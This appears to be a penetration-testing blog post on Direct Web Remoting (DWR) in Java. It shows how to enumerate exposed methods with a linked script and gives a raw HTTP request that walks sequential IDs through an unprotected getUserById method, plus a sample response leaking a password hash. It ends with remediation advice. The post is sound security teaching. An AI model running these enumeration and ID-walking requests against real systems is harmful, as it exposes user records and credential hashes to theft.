---
title: "DWR service harvesting"
description: "Enumerating DWR methods leading to information disclosure"
pubDate: "Oct 20 2026"
heroImage: "/java.webp"
tags: ["pentest", "dwr", "automation"]
badge: "NEW"
---

## What is DWR?
 
Direct Web Remoting (DWR) is a Java library that allows client-side JavaScript to invoke server-side Java methods as though they were local functions:
 
```javascript
UserService.getUserById(1, function(user) { console.log(user.username); });
```
 
To support this, DWR generates a JavaScript stub for each remoted class served at `/…/interface/<Service>.js` and routes the actual calls through a POST endpoint at `/…/call/plaincall/<Service>.<method>.dwr`.
 
Two properties make it worth close attention:
 
- Every remoted method is an HTTP endpoint.
- Developers tend to miss enforcing authorization on custom methods.

The debug console at `/dwr/index.html` lists everything, but it’s usually disabled in production. The interface stubs, however, are not; the application can’t call a method unless the browser first loads its stub, which keeps those files reachable and each one enumerates the methods its class exposes.
 
---
 
## Enumerating the surface: dwr_reaper.py
 
> PoC: **[github.com/olofmagn/proof-of-concepts/blob/master/dwr_reaper.py](https://github.com/olofmagn/proof-of-concepts/blob/master/dwr_reaper.py)**
 
`dwr_reaper.py` fetches each interface stub and extracts the methods DWR wires up. Every method generates a `dwr.engine._execute(path, 'Service', 'method', …)` call, so one regex recovers the inventory:
 
```python
EXEC_PATTERN = re.compile(r"_execute\((.*?)\)")
```
 
It loads a list of service names (your own via `-i`, or a built-in fallback of ~24 common ones), requests `{base}/{service}.js` for each, parses the `_execute` call sites and takes the 2nd and 3rd comma-separated fields as service and method:
 
```bash
python3 dwr_reaper.py https://app.example.com/dwr/interface -i services.txt -o out.json
```
 
```json
{ "UserService": ["getUserById", "listUsers", "updateUser"] }
```
 
A method like `getUserById` that accepts a numeric identifier is a prime candidate for testing, as a single request reveals whether it enforces any authorization on the caller.
 
---
 
## A working example: IDOR in getUserById
 
Because a single numeric parameter usually maps to a sequential ID in the database, records can be walked one by one through `getUserById` if nothing validates the caller. Requesting records belonging to other accounts confirms the method leaks data across authorization boundaries.
 
### Reproduce
 
Register, log in, then POST to the method's `plaincall` endpoint:
 
```http
POST /dwr/call/plaincall/UserService.getUserById.dwr HTTP/2
Host: app.example.com
 
callCount=1
c0-scriptName=UserService
c0-methodName=getUserById
c0-param0=number:1
c0-id=1
batchId=1
instanceId=0
page=%2Findex.html
scriptSessionId=<your-session-id>
```
 
Increment `c0-param0=number:<id>` and resend. If each value returns a different record, there’s no authorization tying the caller to the object and iterating the ID walks the whole user table.
 
### Response
 
```javascript
//#DWR-REPLY
dwr.engine.remote.handleCallback("1","1",{
  id:1, username:"jdoe", displayName:"Jane Doe",
  email:"jdoe@example.com", role:"staff",
  internalUser:false, storeId:1000003,
  passwordHash:"$2a$05$<bcrypt-hash>"
});
```
 
Two issues stand out. First, the method performs no authorization check, as any ID is accepted from any session. Second, it returns internal flags, store IDs, and a password hash that should never be returned to the caller. The bcrypt cost factor of `05` (the `$2a$05$` prefix) is low enough to make offline cracking cheap.
 
### Impact
An attacker can enumerate every account, harvesting usernames and weak password hashes. The hashes are then exposed to offline cracking, and the recovered credentials enable credential stuffing, impersonation, and targeted phishing.
 
### Severity
 
The severity of this report was rated CVSS 3.0 Medium with low attack complexity and exposure of crackable credential material.
 
```
CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
```
 
---
 
### Root cause & fix
 
Two problems, both common in DWR apps:
 
- **Enforce authorization on custom developed methods**. Verify the authenticated caller is entitled to the requested record.
- **Return a narrow DTO**. Send only the fields the caller needs, and configure the DWR converter to whitelist properties so `passwordHash` and other internals are never marshalled to the client.

More generally: disable debug in production, remote the minimum set of classes and methods, and treat every remoted method as a public endpoint because it is.
 
---
 
**Tool:** [github.com/olofmagn/proof-of-concepts/blob/master/dwr_reaper.py](https://github.com/olofmagn/proof-of-concepts/blob/master/dwr_reaper.py)


